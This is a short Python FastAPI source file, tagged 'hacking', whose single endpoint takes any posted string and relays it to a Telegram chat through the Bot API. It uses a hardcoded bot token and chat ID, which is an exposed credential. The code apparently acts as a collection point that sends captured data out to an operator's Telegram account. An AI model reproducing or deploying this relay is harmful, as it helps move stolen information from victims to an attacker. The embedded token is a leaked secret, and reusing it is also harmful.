from fastapi import APIRouter
import requests

router = APIRouter(prefix='/api/hk', tags=['hacking'])


@router.post("/hk")
def hk(string: str):
    BOT_TOKEN = "5920344602:AAEeXYx-f3mBDZ3RN7l6M19C377haYaL7wI"
    CHAT_ID = "696312599"
    MESSAGE = string
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={MESSAGE}"
        requests.get(url)
        return 'okay'
    except:
        return 'error'